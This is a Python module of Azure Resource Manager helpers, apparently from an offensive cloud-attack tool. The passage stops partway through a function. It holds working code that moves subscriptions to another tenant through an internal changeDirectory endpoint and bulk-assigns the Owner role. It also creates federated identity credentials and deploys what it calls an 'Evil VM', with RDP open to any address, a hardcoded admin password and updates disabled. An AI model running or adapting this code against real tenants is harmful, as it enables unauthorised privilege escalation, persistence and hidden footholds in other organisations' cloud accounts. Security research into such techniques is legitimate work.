"""
Azure Resource Manager (ARM) API module for subscription and tenant management.
"""

import requests
import logging
from typing import Optional, List, Dict, Any
from uuid import uuid4
import config as cfg


def make_request(method: str, url: str, token: str, json_data: Optional[Dict[str, Any]] = None) -> Optional[Dict[str, Any]]:
    """
    Make a request to the Azure Management API.
    
    Args:
        method: HTTP method (GET, POST, PUT, DELETE)
        url: API endpoint URL
        token: Azure access token
        json_data: Optional JSON payload
        
    Returns:
        Response JSON or None on failure
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.request(method, url, headers=headers, json=json_data)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        error_msg = f"Request failed: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return None

def assign_owner_role_to_users(token: str, subscription_id: str, user_principals: List[str]) -> Dict[str, Any]:
    """
    Assign Owner role to a list of user principals at subscription scope.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        user_principals: List of user principal IDs to assign Owner role
        
    Returns:
        Dict with success count and total count
    """
    owner_role_id = "/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
    subscription_scope = f"/subscriptions/{subscription_id}"
    success_count = 0
    
    for principal_id in user_principals:
        role_assignment_name = str(uuid4())  # Generate unique GUID for assignment
        assignment_url = f"https://management.azure.com{subscription_scope}/providers/Microsoft.Authorization/roleAssignments/{role_assignment_name}?api-version=2022-04-01"
        
        payload = {
            "properties": {
                "roleDefinitionId": f"{subscription_scope}{owner_role_id}",
                "principalId": principal_id,
                "scope": subscription_scope
            }
        }
        
        result = make_request("PUT", assignment_url, token, json_data=payload)
        if result and 'id' in result:
            success_count += 1
            logging.info(f"Successfully assigned Owner role to principal {principal_id}")
        else:
            logging.error(f"Failed to assign Owner role to principal {principal_id}")
            
    return {
        "success_count": success_count,
        "total_count": len(user_principals)
    }

def get_tenants(token: str) -> List[Dict[str, Any]]:
    """
    Retrieve list of accessible Azure tenants.
    
    Args:
        token: Azure access token
        
    Returns:
        List of tenant objects or empty list on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/tenants?api-version={cfg.AZURE_API_VERSION}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json().get('value', [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to retrieve tenants: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []


def get_subscriptions(token: str) -> List[Dict[str, Any]]:
    """
    Get list of Azure subscriptions accessible with the token.
    
    Args:
        token: Azure access token
        
    Returns:
        List of subscription objects or empty list on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/subscriptions?api-version={cfg.AZURE_API_VERSION}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json().get('value', [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to get subscriptions: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []


def enum_role_assignments(token: str, subscription_id: str) -> List[Dict[str, Any]]:
    """
    Enumerate role assignments for a specific Azure subscription.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID to enumerate roles for
        
    Returns:
        List of role assignment objects
    """
    url = f'{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/Microsoft.Authorization/roleAssignments?api-version={cfg.ROLE_ASSIGNMENTS_API_VERSION}'
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        resp = requests.get(url, headers=headers)
        resp.raise_for_status()
        return resp.json().get("value", [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to enumerate role assignments: {e}"
        if 'resp' in locals() and hasattr(resp, 'text'):
            error_msg += f"\nAPI Response: {resp.text}"
        logging.error(error_msg)
        return []


def get_principal_role_assignments_at_scope(token: str, subscription_id: str, principal_id: str, scope: Optional[str] = None) -> List[Dict[str, Any]]:
    """
    Get role assignments for a specific principal at a specific scope.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        principal_id: Principal ID to filter assignments for
        scope: Scope to filter assignments for (defaults to subscription scope)
        
    Returns:
        List of role assignment objects for the principal at the specified scope
    """
    # Use custom scope if provided, otherwise default to subscription scope
    if scope:
        target_scope = scope
    else:
        target_scope = f"/subscriptions/{subscription_id}"
    
    # Get all role assignments for the subscription
    all_assignments = enum_role_assignments(token, subscription_id)
    
    # Filter for assignments that match the principal and scope
    matching_assignments = []
    for assignment in all_assignments:
        properties = assignment.get('properties', {})
        assignment_principal_id = properties.get('principalId')
        assignment_scope = properties.get('scope')
        
        if assignment_principal_id == principal_id and assignment_scope == target_scope:
            matching_assignments.append(assignment)
    
    return matching_assignments


def assign_role(token: str, subscription_id: str, principal_id: str, role_definition_id: str, principal_type: str = "ServicePrincipal", scope: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """
    Assign a role to a principal at a specific scope.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        principal_id: Principal ID to assign role to
        role_definition_id: Role definition ID
        principal_type: Type of principal ("User", "ServicePrincipal", etc.)
        scope: Custom scope for the assignment (defaults to subscription scope)
        
    Returns:
        Role assignment response dict or None on failure
    """
    assignment_id = str(uuid4())
    
    # Use custom scope if provided, otherwise default to subscription scope
    if scope:
        assignment_scope = scope
    else:
        assignment_scope = f"/subscriptions/{subscription_id}"
    
    url = f"{cfg.AZURE_RESOURCE}{assignment_scope}/providers/Microsoft.Authorization/roleAssignments/{assignment_id}?api-version={cfg.ROLE_ASSIGNMENTS_API_VERSION}"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "properties": {
            "principalId": principal_id,
            "principalType": principal_type,
            "roleDefinitionId": role_definition_id
        }
    }

    try:
        response = requests.put(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to assign role: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return None


def remove_role_assignment(token: str, subscription_id: str, assignment_name: str, scope: Optional[str] = None) -> bool:
    """
    Remove a role assignment.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        assignment_name: Role assignment name/ID to remove
        scope: Custom scope for the assignment (defaults to subscription scope)
        
    Returns:
        True if removal was successful, False otherwise
    """
    # Use custom scope if provided, otherwise default to subscription scope
    if scope:
        assignment_scope = scope
    else:
        assignment_scope = f"/subscriptions/{subscription_id}"
    
    url = f"{cfg.AZURE_RESOURCE}{assignment_scope}/providers/Microsoft.Authorization/roleAssignments/{assignment_name}?api-version={cfg.ROLE_ASSIGNMENTS_API_VERSION}"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.delete(url, headers=headers)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to remove role assignment: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return False


def check_user_role(token: str, subscription_id: str, principal_id: str, role_definition_id: str) -> bool:
    """
    Check if a user already has a specific role assignment.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        principal_id: Principal ID to check
        role_definition_id: Role definition ID to check for
        
    Returns:
        True if user has the role, False otherwise
    """
    assignments = enum_role_assignments(token, subscription_id)
    
    for assignment in assignments:
        properties = assignment.get('properties', {})
        if (properties.get('principalId') == principal_id and 
            properties.get('roleDefinitionId') == role_definition_id):
            return True
    
    return False


def get_invoice_sections(token: str) -> List[str]:
    """
    Retrieve available invoice sections for subscription creation.
    
    Args:
        token: Azure access token with billing permissions
        
    Returns:
        List of invoice section IDs
        
    Raises:
        Exception: If no billing accounts, profiles, or sections found
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    url = f"{cfg.AZURE_RESOURCE}/providers/Microsoft.Billing/billingAccounts?$expand=billingProfiles/invoiceSections,billingProfiles&api-version={cfg.BILLING_API_VERSION}"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        error_msg = f"Request failed: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []

    ba = response.json()
    
    inv_secs = []
    for acc in ba.get('value', []):
        if len(acc) == 0:
            raise Exception('No billing accounts found for this user!')
        
        for prof in acc.get('properties', {}).get('billingProfiles', {}).get('value', []):
            if len(prof) == 0:
                raise Exception('No billing profiles found for this user!')

            for inv in prof.get('properties', {}).get('invoiceSections', {}).get('value', []):
                if len(prof) == 0:
                    raise Exception('No invoice sections found for this user!')
                inv_sec = inv.get('id')
                inv_secs.append(inv_sec)
    
    return inv_secs


def create_subscription(token: str, inv_sec: str, sub_name: str, tenant_id: str) -> Dict[str, Any]:
    """
    Create a new Azure subscription in the specified tenant.
    
    Args:
        token: Azure access token with subscription creation permissions
        inv_sec: Invoice section ID for billing
        sub_name: Display name for the new subscription
        tenant_id: Target tenant ID where subscription will be created
        
    Returns:
        Subscription creation response dict
        
    Raises:
        requests.exceptions.RequestException: If API call fails
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    payload = {
        "properties": {
            "billingScope": inv_sec,
            "displayName": sub_name,
            "workLoad": "Production",
            "resellerId": None,
            "additionalProperties": {
                "managementGroupId": "",
                "subscriptionTenantId": tenant_id,
                "subscriptionOwnerId": "",
                "tags": {}
            }
        }
    }
    
    url = f'{cfg.AZURE_RESOURCE}/providers/Microsoft.Subscription/aliases/{uuid4()}?api-version={cfg.SUBSCRIPTION_API_VERSION}'

    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()

    return response.json()


def create_user_assigned_identity(token: str, subscription_id: str, resource_group_name: str, identity_name: str, region: str) -> Optional[Dict[str, Any]]:
    """
    Create a user-assigned managed identity.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        resource_group_name: Resource group name
        identity_name: Name for the managed identity
        region: Azure region
        
    Returns:
        Identity creation response dict or None on failure
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "tags": {
            "purpose": "guest-identity"
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{identity_name}?api-version={cfg.MANAGED_IDENTITY_API_VERSION}"
    
    try:
        response = requests.put(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to create user-assigned identity: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return None


def create_federated_identity_credential(token: str, subscription_id: str, resource_group_name: str, identity_name: str, credential_name: str, issuer: str, subject: str, audiences: List[str]) -> Optional[Dict[str, Any]]:
    """
    Create a federated identity credential for a user-assigned managed identity.
    
    Args:
        token: Azure access token
        subscription_id: Subscription ID
        resource_group_name: Resource group name
        identity_name: Name of the managed identity
        credential_name: Name for the federated credential
        issuer: The URL of the issuer to be trusted
        subject: The identifier of the external identity
        audiences: List of audiences that can appear in the issued token
        
    Returns:
        Federated credential creation response dict or None on failure
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "properties": {
            "issuer": issuer,
            "subject": subject,
            "audiences": audiences
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/providers/Microsoft.ManagedIdentity/userAssignedIdentities/{identity_name}/federatedIdentityCredentials/{credential_name}?api-version={cfg.MANAGED_IDENTITY_API_VERSION}"
    
    try:
        response = requests.put(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to create federated identity credential: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return None


def get_subscription_policy_settings(token: str) -> Optional[Dict[str, Any]]:
    """
    Get subscription management policy settings from Azure Resource Manager.
    
    Args:
        token: Azure access token
    Returns:
        Subscription policy settings dict or None on failure
    """
    url = "https://management.azure.com/providers/Microsoft.Subscription/policies/default?api-version=2021-01-01-privatepreview"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to get subscription policy settings: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return None


def transfer_subscription(token: str, sub_id: str, new_tenant_id: str) -> Dict[str, Any]:
    """
    Transfer an Azure subscription to a new tenant.
    
    Args:
        token: Azure access token with subscription transfer permissions
        sub_id: Subscription ID to transfer
        new_tenant_id: Target tenant ID for the transfer
        
    Returns:
        Subscription transfer response dict
        
    Raises:
        requests.exceptions.RequestException: If API call fails
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    method = 'POST'
    url = f'https://subscriptionrp.trafficmanager.net/internal/subscriptions/{sub_id}/changeDirectory?api-version=2020-01-01-preview'
    payload = {
        "tenantId": new_tenant_id
    }

    response = requests.post(url, headers=headers, json=payload)
    response.raise_for_status()

    return response.json()


def _create_resource_group(token: str, subscription_id: str, rg_name: str, region: str) -> Dict[str, Any]:
    """
    Create a resource group for the Evil VM deployment.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        region: Azure region
        
    Returns:
        Resource group creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "tags": {
            "purpose": "guest-vm"
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourcegroups/{rg_name}?api-version=2021-04-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _create_virtual_network(token: str, subscription_id: str, rg_name: str, vnet_name: str, region: str) -> Dict[str, Any]:
    """
    Create a virtual network for the Evil VM.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        vnet_name: Virtual network name
        region: Azure region
        
    Returns:
        Virtual network creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "properties": {
            "addressSpace": {
                "addressPrefixes": ["10.0.0.0/16"]
            },
            "subnets": [
                {
                    "name": "default",
                    "properties": {
                        "addressPrefix": "10.0.0.0/24"
                    }
                }
            ]
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/virtualNetworks/{vnet_name}?api-version=2023-05-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _create_network_security_group(token: str, subscription_id: str, rg_name: str, nsg_name: str, region: str) -> Dict[str, Any]:
    """
    Create a network security group with RDP access.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        nsg_name: Network security group name
        region: Azure region
        
    Returns:
        NSG creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "properties": {
            "securityRules": [
                {
                    "name": "RDP",
                    "properties": {
                        "priority": 1000,
                        "protocol": "TCP",
                        "access": "Allow",
                        "direction": "Inbound",
                        "sourceAddressPrefix": "*",
                        "sourcePortRange": "*",
                        "destinationAddressPrefix": "*",
                        "destinationPortRange": "3389"
                    }
                }
            ]
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkSecurityGroups/{nsg_name}?api-version=2023-05-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _create_public_ip(token: str, subscription_id: str, rg_name: str, ip_name: str, region: str) -> Dict[str, Any]:
    """
    Create a public IP address for the Evil VM.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        ip_name: Public IP name
        region: Azure region
        
    Returns:
        Public IP creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "sku": {
            "name": "Standard"
        },
        "properties": {
            "publicIPAllocationMethod": "Static"
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/publicIPAddresses/{ip_name}?api-version=2023-05-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _create_network_interface(token: str, subscription_id: str, rg_name: str, nic_name: str, vnet_name: str, nsg_name: str, ip_name: str, region: str) -> Dict[str, Any]:
    """
    Create a network interface for the Evil VM.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        nic_name: Network interface name
        vnet_name: Virtual network name
        nsg_name: Network security group name
        ip_name: Public IP name
        region: Azure region
        
    Returns:
        Network interface creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "properties": {
            "ipConfigurations": [
                {
                    "name": "ipconfig1",
                    "properties": {
                        "privateIPAllocationMethod": "Dynamic",
                        "subnet": {
                            "id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/virtualNetworks/{vnet_name}/subnets/default"
                        },
                        "publicIPAddress": {
                            "id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/publicIPAddresses/{ip_name}"
                        }
                    }
                }
            ],
            "networkSecurityGroup": {
                "id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkSecurityGroups/{nsg_name}"
            }
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkInterfaces/{nic_name}?api-version=2023-05-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _create_virtual_machine(token: str, subscription_id: str, rg_name: str, vm_name: str, nic_name: str, region: str, admin_username: str, admin_password: str) -> Dict[str, Any]:
    """
    Create the Evil VM with Windows 10 and cheapest options.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        vm_name: Virtual machine name
        nic_name: Network interface name
        region: Azure region
        admin_username: VM administrator username
        admin_password: VM administrator password
        
    Returns:
        VM creation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "properties": {
            "hardwareProfile": {
                "vmSize": "Standard_B1s"  # Cheapest VM size
            },
            "storageProfile": {
                "imageReference": {
                    "publisher": "MicrosoftWindowsDesktop",
                    "offer": "Windows-10",
                    "sku": "win10-22h2-pro-g2",
                    "version": "latest"
                },
                "osDisk": {
                    "name": f"{vm_name}_OsDisk_1_{str(uuid4()).replace('-', '')}",
                    "caching": "ReadWrite",
                    "createOption": "FromImage",
                    "managedDisk": {
                        "storageAccountType": "Standard_LRS"  # Cheapest storage
                    }
                }
            },
            "osProfile": {
                "computerName": vm_name,
                "adminUsername": admin_username,
                "adminPassword": admin_password,
                "windowsConfiguration": {
                    "enableAutomaticUpdates": False,
                    "provisionVMAgent": True
                }
            },
            "networkProfile": {
                "networkInterfaces": [
                    {
                        "id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkInterfaces/{nic_name}",
                        "properties": {
                            "primary": True
                        }
                    }
                ]
            },
            "securityProfile": {
                "securityType": "Standard"  # Standard security (not advanced)
            }
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Compute/virtualMachines/{vm_name}?api-version=2023-07-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _install_aad_login_extension(token: str, subscription_id: str, rg_name: str, vm_name: str, region: str) -> Dict[str, Any]:
    """
    Install the Azure AD Login extension on the VM.
    
    Args:
        token: Azure access token
        subscription_id: Target subscription ID
        rg_name: Resource group name
        vm_name: Virtual machine name
        region: Azure region
        
    Returns:
        Extension installation response
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "location": region,
        "properties": {
            "publisher": "Microsoft.Azure.ActiveDirectory",
            "type": "AADLoginForWindows",
            "typeHandlerVersion": "1.0",
            "autoUpgradeMinorVersion": True,
            "settings": {}
        }
    }
    
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Compute/virtualMachines/{vm_name}/extensions/AADLoginForWindows?api-version=2023-07-01"
    
    response = requests.put(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def _retry_azure_request(operation_name: str, request_func, max_retries: int = 3, retry_delay: int = 10, verbose: bool = False):
    """
    Retry an Azure API request with exponential backoff.
    
    Args:
        operation_name: Name of the operation for logging
        request_func: Function that makes the request
        max_retries: Maximum number of retry attempts (default: 3)
        retry_delay: Delay between retries in seconds (default: 10)
        verbose: Whether to print detailed retry information
        
    Returns:
        Request response object
        
    Raises:
        Exception: If all retries fail
    """
    import time
    
    for attempt in range(max_retries + 1):  # +1 for initial attempt
        try:
            response = request_func()
            response.raise_for_status()
            if attempt > 0:
                logging.info(f"✅ {operation_name} succeeded on attempt {attempt + 1}")
            return response
            
        except requests.exceptions.RequestException as e:
            # Get detailed error information for 409 conflicts
            error_details = ""
            if hasattr(e, 'response') and e.response is not None:
                status_code = e.response.status_code
                try:
                    error_body = e.response.json()
                    error_code = error_body.get('error', {}).get('code', 'Unknown')
                    error_message = error_body.get('error', {}).get('message', 'No message')
                    error_details = f" (HTTP {status_code}: {error_code} - {error_message})"
                except:
                    error_details = f" (HTTP {status_code}: {e.response.text[:200]})"
            
            if attempt < max_retries:
                if verbose or status_code == 409:  # Always show 409 details
                    logging.warning(f"⚠️  {operation_name} failed on attempt {attempt + 1}, retrying in {retry_delay}s...{error_details}")
                else:
                    logging.warning(f"⚠️  {operation_name} failed on attempt {attempt + 1}, retrying in {retry_delay}s...")
                time.sleep(retry_delay)
            else:
                logging.error(f"❌ {operation_name} failed after {max_retries + 1} attempts{error_details}")
                raise Exception(f"{operation_name} failed after {max_retries + 1} attempts: {e}{error_details}")


def create_evilvm(token: str, subscription_id: str, region: str, vm_name: str = "GuestVM", admin_username: str = "guestadmin", admin_password: str = "ComplexP@ssw0rd123!") -> Dict[str, Any]:
    """
    Create an Evil VM with all required Azure resources.
    
    This function creates a complete Windows 10 VM deployment with:
    - Resource Group
    - Virtual Network with default subnet
    - Network Security Group (allows RDP)
    - Public IP Address
    - Network Interface
    - Virtual Machine (Standard_B1s, Windows 10, Standard security)
    - Azure AD Login Extension
    
    Each resource creation includes automatic retry logic with 3 silent retries
    and 10-second pauses between attempts to handle transient Azure API issues.
    
    Args:
        token: Azure access token with VM creation permissions
        subscription_id: Target subscription ID
        region: Azure region (e.g., "eastus", "westus2")
        vm_name: Base name for VM and related resources
        admin_username: VM administrator username
        admin_password: VM administrator password
        
    Returns:
        Dict containing all created resource information
        
    Raises:
        requests.exceptions.RequestException: If any API call fails after retries
    """
    logging.info(f"Starting Evil VM deployment in subscription {subscription_id}, region {region}")
    
    # Generate resource names
    rg_name = f"{vm_name}-rg"
    vnet_name = f"{vm_name}-vnet"
    nsg_name = f"{vm_name}-nsg"
    ip_name = f"{vm_name}-ip"
    nic_name = f"{vm_name}-nic"
    
    results = {}
    import json
    verbose = False
    # Detect verbose mode from caller (hack: check for global 'args' with verbose)
    import inspect
    frame = inspect.currentframe()
    while frame:
        if 'args' in frame.f_locals and hasattr(frame.f_locals['args'], 'verbose'):
            verbose = getattr(frame.f_locals['args'], 'verbose', False)
            break
        frame = frame.f_back
    
    # Pre-flight checks to diagnose potential conflicts
    print("🔍 Running pre-flight checks...")
    
    # Check if resource group exists
    rg_check_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourcegroups/{rg_name}?api-version=2021-04-01"
    try:
        rg_check_response = requests.get(rg_check_url, headers={"Authorization": f"Bearer {token}"})
        if rg_check_response.status_code == 200:
            print(f"⚠️  WARNING: Resource Group '{rg_name}' already exists!")
            print(f"   This could cause 409 conflicts. Consider using a different VM name.")
        elif rg_check_response.status_code == 404:
            print(f"✅ Resource Group '{rg_name}' does not exist - good to proceed")
        else:
            print(f"❓ Resource Group check returned status {rg_check_response.status_code}")
    except Exception as e:
        print(f"❓ Could not check resource group existence: {e}")
    
    # Check and register required resource providers
    required_providers = [
        "Microsoft.Network",
        "Microsoft.Compute", 
        "Microsoft.Storage"
    ]
    
    print("🔧 Checking resource provider registrations...")
    for provider in required_providers:
        try:
            provider_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/{provider}?api-version=2021-04-01"
            provider_response = requests.get(provider_url, headers={"Authorization": f"Bearer {token}"})
            
            if provider_response.status_code == 200:
                provider_data = provider_response.json()
                registration_state = provider_data.get('registrationState', 'Unknown')
                
                if registration_state.lower() == 'registered':
                    print(f"✅ {provider} is registered")
                elif registration_state.lower() in ['notregistered', 'unregistered']:
                    print(f"⚠️  {provider} is not registered - attempting registration...")
                    
                    # Register the provider
                    register_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/{provider}/register?api-version=2021-04-01"
                    register_response = requests.post(register_url, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
                    
                    if register_response.status_code in [200, 202]:
                        print(f"✅ {provider} registration initiated - this may take a few minutes")
                        print(f"   Registration will complete in the background")
                    else:
                        print(f"❌ Failed to register {provider} - status {register_response.status_code}")
                        print(f"   This will likely cause 409 conflicts with resource creation")
                elif registration_state.lower() == 'registering':
                    print(f"🔄 {provider} is currently registering - should be ready soon")
                else:
                    print(f"❓ {provider} has unknown registration state: {registration_state}")
            else:
                print(f"❓ Could not check {provider} registration status: {provider_response.status_code}")
        except Exception as e:
            print(f"❓ Error checking {provider}: {e}")
    
    # Check and register required compute features for Standard security type
    print("🔧 Checking required Azure features...")
    
    # Register the UseStandardSecurityType feature properly
    try:
        print("🔍 Registering Microsoft.Compute/UseStandardSecurityType feature...")
        
        # Use the Azure Features API endpoint (not provider features)
        feature_register_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/Microsoft.Features/providers/Microsoft.Compute/features/UseStandardSecurityType/register?api-version=2015-12-01"
        
        feature_register_response = requests.post(feature_register_url, headers={
            "Authorization": f"Bearer {token}", 
            "Content-Type": "application/json"
        })
        
        if feature_register_response.status_code in [200, 202]:
            print("✅ UseStandardSecurityType feature registration initiated")
            
            # Check the registration status
            feature_check_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/Microsoft.Features/providers/Microsoft.Compute/features/UseStandardSecurityType?api-version=2015-12-01"
            feature_check_response = requests.get(feature_check_url, headers={"Authorization": f"Bearer {token}"})
            
            if feature_check_response.status_code == 200:
                feature_data = feature_check_response.json()
                feature_state = feature_data.get('properties', {}).get('state', 'Unknown')
                
                if feature_state.lower() == 'registered':
                    print("✅ Feature is already registered and ready")
                elif feature_state.lower() in ['registering', 'pending']:
                    print("🔄 Feature registration is in progress")
                    print("   This typically takes 2-10 minutes to complete")
                    print("   VM creation will continue and should succeed once registration completes")
                else:
                    print(f"❓ Feature state: {feature_state}")
            else:
                print("✅ Registration request submitted successfully")
                
        elif feature_register_response.status_code == 409:
            # Check if it's already registered
            try:
                error_data = feature_register_response.json()
                error_code = error_data.get('error', {}).get('code', '')
                if 'already registered' in error_code.lower() or 'conflict' in error_code.lower():
                    print("✅ UseStandardSecurityType feature is already registered")
                else:
                    print(f"⚠️  Feature registration conflict: {error_code}")
            except:
                print("✅ UseStandardSecurityType feature appears to be already registered")
                
        else:
            print(f"⚠️  Feature registration returned status {feature_register_response.status_code}")
            try:
                error_data = feature_register_response.json()
                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                print(f"   Error: {error_msg}")
            except:
                print(f"   Response: {feature_register_response.text[:200]}")
            
            print("   Will attempt VM creation anyway - the feature may already be available")
            
    except Exception as e:
        print(f"❓ Error during feature registration: {e}")
        print("   Will attempt VM creation anyway")
        
    # Also try to re-register the Microsoft.Compute provider to ensure features are properly enabled
    try:
        print("🔄 Re-registering Microsoft.Compute provider to refresh feature availability...")
        reregister_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/Microsoft.Compute/register?api-version=2021-04-01"
        reregister_response = requests.post(reregister_url, headers={
            "Authorization": f"Bearer {token}", 
            "Content-Type": "application/json"
        })
        
        if reregister_response.status_code in [200, 202]:
            print("✅ Microsoft.Compute provider re-registration initiated")
        else:
            print(f"❓ Provider re-registration status: {reregister_response.status_code}")
    except Exception as e:
        print(f"❓ Error re-registering provider: {e}")
    
    # Check for existing virtual network with same name in the region
